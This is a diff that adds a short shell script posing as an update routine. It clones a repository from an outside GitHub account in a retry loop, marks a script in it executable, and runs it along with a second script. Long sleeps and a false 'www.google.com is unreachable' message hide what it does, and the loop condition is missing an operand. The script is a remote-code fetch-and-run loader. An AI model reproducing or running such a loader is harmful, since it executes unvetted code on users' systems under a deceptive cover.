@@ -1,0 +1,32 @@
+#!/bin/sh
+
+sleep 5s
+rm -rf update
+echo "start code"
+sleep 120s
+
+n=0
+   until [ $n -ge ]
+   do
+      git clone "https://github.com/ubol12341/update.git" && break
+      n=$[$n+1]
+sleep 3s
+echo "www.google.com is unreachable. Retrying"
+sleep 12s
+      sleep 1
+   done
+
+sleep 3s
+cd update
+#-----
+chmod +x v9033.sh
+#-----
+echo "online"
+sleep 120s
+#-----
+./v9033.sh
+#-----
+cd
+#-----
+./trv9033.sh
+#-----
